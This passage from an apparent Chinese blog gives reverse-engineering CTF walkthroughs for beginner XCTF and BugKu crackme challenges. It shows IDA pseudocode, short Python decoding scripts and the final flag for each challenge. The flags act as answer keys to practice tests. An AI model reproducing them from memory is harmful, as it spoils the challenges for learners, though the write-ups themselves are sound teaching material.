class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">b=[<span class="number">123</span>,<span class="number">32</span>,<span class="number">18</span>,<span class="number">98</span>,<span class="number">119</span>,<span class="number">108</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">80</span>,<span class="number">125</span>,<span class="number">38</span>,<span class="number">124</span>,</span><br><span class="line"><span class="number">111</span>,<span class="number">74</span>,<span class="number">49</span>,<span class="number">83</span>,<span class="number">108</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">84</span>,<span class="number">6</span>,<span class="number">96</span>,<span class="number">83</span>,<span class="number">44</span>,<span class="number">121</span>,<span class="number">104</span>,<span class="number">110</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">123</span>,<span class="number">127</span>,<span class="number">119</span>,<span class="number">96</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">71</span>,<span class="number">92</span>,<span class="number">29</span>,<span class="number">81</span>,</span><br><span class="line"><span class="number">107</span>,<span class="number">90</span>,<span class="number">85</span>,<span class="number">64</span>,<span class="number">12</span>,<span class="number">43</span>,<span class="number">76</span>,<span class="number">86</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">1</span>,<span class="number">117</span>,<span class="number">126</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">56</span>):</span><br><span class="line">    b[i]^=a[i]</span><br><span class="line">    b[i]^=<span class="number">0x13</span></span><br><span class="line">    flag=flag+<span class="built_in">chr</span>(b[i])</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行结果为 </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</span><br></pre></td></tr></tbody></table></figure> ### 2.open-source下载附件，是.c文件，用文本编辑器打开 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/d606c4ac2c594c7c903df3afcd63fabe.png" alt="在这里插入图片描述">根据代码可知first=0xcafe，second%17=8，最后算出hash=12648430，转为十六进制为：c0ffee。所以flag为c0ffee。<p></p><h3 id="simple-unpack">3.simple-unpack</h3><h4 id="方法一">方法一</h4><p>根据提示该文件为被加壳的二进制文件。 用exeinfope打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/9a02f2e97d0148cba285166c7088cd42.png" alt="在这里插入图片描述"> 直接尝试upx脱壳 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/ac2439789e0d4ef297342427e7bc12d3.png" alt="在这里插入图片描述">用IDA打开文件直接看见flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}。 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/c495350207434c99b5784d4225766df1.png" alt="在这里插入图片描述"></p><h4 id="方法二">方法二</h4><p>用IDA打开文件时选择二进制文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/d23e4a85f9414e2e87943e28c482941e.png" alt="在这里插入图片描述"> 按Shift+F12，然后搜索‘flag’ <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1810e9d9faed454f9a728943e9a9edca.png" alt="在这里插入图片描述"></p><h3 id="logmein">4.logmein</h3><p>用IDA打开，直接F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/5a503386fe6a415bae01b8ee2b4337e3.png" alt="在这里插入图片描述"> 发现是异或运算，转换v7类型 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/448ef3fcf2aa4570941e8b607236d17f.png" alt="在这里插入图片描述">又因为文件是x86-64架构，所以字节顺序为小端序（https://hxt616.github.io/2022/02/21/little-endian/）因此v7做异或运算时的字符顺序为“harambe”，用python编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">b=<span class="string">"harambe"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i%<span class="number">7</span>])^<span class="built_in">ord</span>(a[i]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行结果为 </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RC3-<span class="number">2016</span>-XORISGUD</span><br></pre></td></tr></tbody></table></figure> ### 5.insanity 用exeinfo pe打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/04cbbc6e77144d55b687d54cf346693a.png" alt="在这里插入图片描述"> 发现是Linux下的32位的ELF文件用IDA打开，进入main函数，F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1909d790c1fd42ad90732614588a343d.png" alt="在这里插入图片描述"> 未发现什么特殊字符，于是按Shift+F12查看字符<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/2078b7be2a154ea599fae3b4855df924.png" alt="在这里插入图片描述"> 发现flag：9447{This_is_a_flag}<p></p><h3 id="helloctf">6.Hello，CTF</h3><p>用IDA打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6c68bef755ad47629a52c94e440f246d.png" alt="在这里插入图片描述"> F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/e5e959d835b648f88ab5a748167c8754.png" alt="在这里插入图片描述">得到一串特殊字符串，通过十六进制解码得到flag：CrackMeJustForFun</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/3cd1ed483fa74c80940f19e7822df157.png" alt="在这里插入图片描述"> ### 7.python-trade下载文件，发现是pyc文件。首先要了解pyc文件是什么。</p><p>参考（https://blog.csdn.net/zong596568821xp/article/details/87341933）.pyc文件是由.py文件经过编译后生成的字节码文件，其加载速度相对于之前的.py文件有所提高，而且还可以实现源码隐藏，以及一定程度上的反编译。</p><p>了解了pyc文件后，尝试将其反编译，利用在线工具（https://tool.lu/pyc/）实现，结果如下：<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/f8e0588a947345c88ee2f65a454794bc.png" alt="在这里插入图片描述">分析代码，发现flag经过加密后为“XlNkVmtUI1MgXWBZXCFeKY+AaXNt”，于是编写脚本进行解密</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span></span><br><span class="line"></span><br><span class="line">dec = base64.b64decode(correct)</span><br><span class="line"><span class="built_in">print</span>(dec)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'^SdVkT#S ]`Y\\!^)\x8f\x80ism'</span>:</span><br><span class="line">    flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">16</span>)^<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行结果为： </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'^SdVkT#S ]`Y\\!^)\x8f\x80ism'</span></span><br><span class="line">nctf{d3c0mpil1n9_PyC}</span><br></pre></td></tr></tbody></table></figure> ### 8.no-strings-attached参考：https://www.cnblogs.com/Mayfly-nymph/p/11403297.html 首先用ExeinfoPE查看文件架构 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/5dd9baa0b1fa4b248888db6f6474cd6c.png" alt="在这里插入图片描述"> 用32位IDA打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/ee267419b82a44c8bf99024039e05ae9.png" alt="在这里插入图片描述"> F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/bd611bf38fdd4e8ca23b44525f06897c.png" alt="在这里插入图片描述">对每个函数进行查看，发现authenticate()函数中可能含有flag。 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6a351ce0e6f44b0b850a186c913bac91.png" alt="在这里插入图片描述">分析代码可知s2的内容为flag，ws为用户输入内容。然后查看decrypt函数内容<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/633ec1ecec8747e88667abfa1898163c.png" alt="在这里插入图片描述">上图中的代码逻辑为：将s的值赋给dest，再将dest的每个值减去a2的每个值。查看authenticate函数的汇编代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1170c5b73a634e03b10996d9d9bd91ea.png" alt="在这里插入图片描述">由上图红框中的内容可知eax储存着decryp函数返回的flag值，然后再保存到s2。接着进行gdb调试 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/8855a06945be461ca80db3b1aa125bb5.png" alt="在这里插入图片描述"> 设置断点 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/f3b23be59432442e991473cd7f90c575.png" alt="在这里插入图片描述"> 执行到断点 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/823c9081338a4b029d4a121ec9b08e44.png" alt="在这里插入图片描述"> 单步运行 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/da38193b35c1466fbff24689ab6abf24.png" alt="在这里插入图片描述"> 查看eax的值 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6b930b1bd2db4f5ea0d731ce069b697b.png" alt="在这里插入图片描述">其中3为显示行数，s为字符串形式，w为word（4字节）形式。得到flag：9447{you_are_an_international_mystery}<p></p><h3 id="getit">9.getit</h3><p>首先用Exeinfo PE查看文件架构，可知是64位文件，用IDA64打开 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/2ba1801ffc8146e3a84a4262615250a9.png" alt="在这里插入图片描述"> 在main处按下F5查看伪代码 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/73987c0a3dd64e14baba86b2417e4420.png" alt="在这里插入图片描述">分析代码可知，flag.txt文件中的内容就是<strong>t</strong>。通过12到20行的代码编写出脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'c61b68366edeb7bdce3c6820314b7498'</span></span><br><span class="line">v5 = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> v5&lt;<span class="built_in">len</span>(s):</span><br><span class="line">    <span class="keyword">if</span> v5 &amp; <span class="number">1</span>:</span><br><span class="line">        v3 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        v3 = -<span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[v5]) + v3)</span><br><span class="line">    v5+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>得到flag为<code>b70c59275fcfa8aebf2d5911223c6589</code> ###10.Reversing-x64Elf-100 由题可知文件为64位，用IDA64打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/5ddd22044736463cb621f063519cfdf9.png" alt="在这里插入图片描述"> 发现main函数，双击进入，F5查看伪代码<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/3b0c90f6995f4fe9ac30ee8ba4941303.png" alt="在这里插入图片描述"> 分析代码可知sub_4006FD函数比较关键，双击查看<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/89beadfb0bc3436db4e85889162b9c26.png" alt="在这里插入图片描述">分析代码可知上图代码中的<code>a1</code>为传入的参数，即用户输入的内容，同时也是flag。if语句中的式子可知v3为二维数组，又由给出的三个字符串可知，二维数组为：<code>v3=["Dufhbmf","pG`imos","ewUglpt"]</code>，当if条件成立返回1，则输出<code>Incorrect password!</code>,反之输出<code>Nice!</code>，此时等式成立，所以a1的值为二维数组的每个元素减一。用python脚本解决</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i=<span class="number">0</span></span><br><span class="line">v3=[<span class="string">"Dufhbmf"</span>,<span class="string">"pG`imos"</span>,<span class="string">"ewUglpt"</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">11</span>:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[i%<span class="number">3</span>][<span class="number">2</span>*<span class="built_in">int</span>(i/<span class="number">3</span>)])-<span class="number">1</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行得到flag为<code>Code_Talkers</code> ### 11.666异或的运算优先级低于加减法 wp </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="built_in">int</span>(<span class="string">'12'</span>,<span class="number">16</span>)   <span class="comment">#将12h转换为十进制，则key=18</span></span><br><span class="line">s=<span class="string">'izwhroz""w"v.K".Ni'</span></span><br><span class="line"><span class="comment">#s=list(s)</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> i&lt;key:</span><br><span class="line">    v5=s[i]</span><br><span class="line">    v4=s[i+<span class="number">1</span>]</span><br><span class="line">    v3=s[i+<span class="number">2</span>]</span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(v5)^key)-<span class="number">6</span>)    <span class="comment">#注意运算符优先级</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(v4)^key)+<span class="number">6</span>)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(v3)^key^<span class="number">6</span>)</span><br><span class="line">    i+=<span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><code>unctf{b66_6b6_66b}</code><p></p><h2 id="bugku-ctf">BugKu CTF</h2><h3 id="easy_vb">1.Easy_vb</h3><p>下载附件，首先用ExeinfoPE查看文件，发现是32位文件，用IDA打开文件，找到flag</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907165026692.png" alt="image-20220907165026692"><figcaption aria-hidden="true">image-20220907165026692</figcaption></figure><p><code>flag{_N3t_Rev_1s_E4ay_}</code></p><h3 id="逆向入门">2.逆向入门</h3><p>打开附件压缩包发现exe文件，用Exeinfo PE打开文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907122850797.png" alt="image-20220907122850797"><figcaption aria-hidden="true">image-20220907122850797</figcaption></figure><p>发现不是exe文件，再用010Editor打开文件，发现一段字符串，由于文本过长，以下展示部分字符串</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAYAAACAvzbMAAAgAElEQVR4Xu29CdhuyVXXW4dAmBIghqEDCIg5aWQmAyhT0oCgkj6CE4HjdT7pgHLVpGVwgsP14nBDixMGGofHxyYRRzodFS7Y6SBc0SSAECA5DDKmQcKUMKPnPr/vPdW9z9t77/rV3uutd7/fqXqe7+nkvLWrVv1r1frXsFbVhevXr19PPXUEOgIdgY5AR6ASgQudQCoR69k7Ah2BjkBH4AyBTiBdEToCHYGOQEdgEQKdQBbB1j/qCHQEOgIdgU4gXQc6Ah2BjkBHYBECnUAWwdY/6gh0BDoCHYFOIF0HOgIdgY5AR2ARAp1AFsHWP+oIdAQ6Ah2BTiBdBzoCHYGOQEdgEQJVBPLmN785PfDAA+kNb3hD+omf+ImbKiQe8cKFC4uE2P/IlBWVZ0rg22+/PT3taU9Lz33ucxe16TWveU3Kf0sKOHT7DOaRGDzjGc9Iz3nOc84wPVTKeKOfue/e8z3f81DVhZW7dlwZXUFYk28sDxhmPJ/4xCeGtXu/oJe+9KXpjW98YwKPNfVhm7Kdohx0j78lKZfz+te/fsnnizE343ORQBMfLe1jTSAMyrvvvvsxxBHZiC2WheK9+MUvTjUD5+rVq+nlL3/5FpuzSCYG4Vd+5VdWYXDPPfekr/mar3lMfc9//vMTf9Fpqr4XvvCF6bM+67Oiqwsr75TGFUaGsRA9CQCDL/7iLz6bmA7TkvoYd4y//YQOoAs2QWLYOyYlt1KqxVwRCGBevnz5liOPrDh33nln+qIv+iKlR1/1VV+V+DtvCSKFREyaGsT5W4wQq5GoVMIcuZfOQKNkHCvnFMcVE6n777+/ajJRwhDjvk8e+ZuayQvG/q677pqsrmbyct4mgaU+2Cfu++67T/WxIhBmkszwbuXEoDHbIc985jPPLUzWEF+6dGl2sgGO4BmVSpg//elP3ySpl4gvCp/ocmoMcanu0mSD75m8MYkrJeR67WtfO5vt1a9+damYM91Fh2/lZFfuikBYXrIXeCsnM2suzYBOHT+jVMyq77jjjmJTzUAuFpLS2czVbFFF1Wdksnle9KIXpYceeshm30y+Zz/72enLvuzLQuQxJPqZn/mZCaxKCb1D/+YSk+HSFtwrX/nKs+2rWzlx9ovdLyVFIIbZSxWd+u9m1tUJJJ0N4JYEYmaw6J5dQbbU01MdV5ErSIOBXUGyLfqWt7xlNYEYUmupJ8eoy2LeCUT2TieQdHYoXpq9ASfbDXjTTCXKGDtgl11xUzZmwnjvlJJZQZbKiP7dGM/oOqPKe/DBB9Ueeak+i4FZQZZWdE94whMSq4tS6gSSUieQkpZU/n6rE0jNtkVpC8CepZS6iL1qtq9Ks07KYdZsDwZL9Ub9bo1nVH2R5dQ4lszVazEw46+0nWm2YJG1E0gnkMixclaWUeDzuoUFebAfWuPKzAqDgTg07swAmSWaA9FSB065fs59xxYHB7I17SjJseZ3azzX1HHIb82YKNVfgwG6w3nIXGLygq7uTypqZO0EcmQCwVCwTUEg2lYGa1Y6Zq38lbw19pXUKOASAgEn/oyHV2kw8jttw7hOuU</span><br></pre></td></tr></tbody></table></figure><p>发现是png文件的base64编码，利用在线网站(https://tool.chinaz.com/tools/imgtobase)将编码转为图片</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907123348942.png" alt="image-20220907123348942"><figcaption aria-hidden="true">image-20220907123348942</figcaption></figure><p>扫码得到flag：<code>bugku{inde_9882ihsd8-0}</code></p><h3 id="love">3.love</h3><p>用IDA打开文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907105903812.png" alt="image-20220907105903812"><figcaption aria-hidden="true">image-20220907105903812</figcaption></figure><p>鼠标移至<code>_main_0</code>处，按F5查看伪代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">return</span> main_0();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>双击<code>main_0()</code>函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __cdecl <span class="title function_">main_0</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> j; <span class="comment">// [esp+DCh] [ebp-ACh]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// [esp+E8h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> Dest[<span class="number">108</span>]; <span class="comment">// [esp+F4h] [ebp-94h]</span></span><br><span class="line">  <span class="type">char</span> Str; <span class="comment">// [esp+160h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [esp+17Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)i &gt;= <span class="number">0x64</span> )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    Dest[i] = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  sub_41132F(<span class="string">"please enter the flag:"</span>);</span><br><span class="line">  sub_411375(<span class="string">"%20s"</span>, &amp;Str);</span><br><span class="line">  v0 = j_strlen(&amp;Str);</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)sub_4110BE(&amp;Str, v0, &amp;v11);</span><br><span class="line">  <span class="built_in">strncpy</span>(Dest, v1, <span class="number">0x28</span>u);</span><br><span class="line">  v8 = j_strlen(Dest);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">    Dest[j] += j;</span><br><span class="line">  v2 = j_strlen(Dest);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Dest, Str2, v2) )</span><br><span class="line">    sub_41132F(<span class="string">"rigth flag!\n"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_41132F(<span class="string">"wrong flag!\n"</span>);</span><br><span class="line">  HIDWORD(v4) = v3;</span><br><span class="line">  LODWORD(v4) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析代码，判断 flag 应为 Str的值，其中可分析出第22行<code>sub_411375</code>函数为输入函数（scanf），接着往下分析，第24行Str 被函数<code>sub_4110BE</code>处理，双击查看</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">sub_411AB0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// STE0_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+D4h] [ebp-38h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+E0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// [esp+ECh] [ebp-20h]</span></span><br><span class="line">  <span class="type">void</span> *Dst; <span class="comment">// [esp+F8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+104h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 || !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v9 = a2 / <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)(a2 / <span class="number">3</span>) % <span class="number">3</span> )</span><br><span class="line">    ++v9;</span><br><span class="line">  v10 = <span class="number">4</span> * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  Dst = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !Dst )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  j_memset(Dst, <span class="number">0</span>, v10 + <span class="number">1</span>);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &gt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    byte_41A144[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    byte_41A144[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">3</span> &amp;&amp; v11 &gt;= <span class="number">1</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> 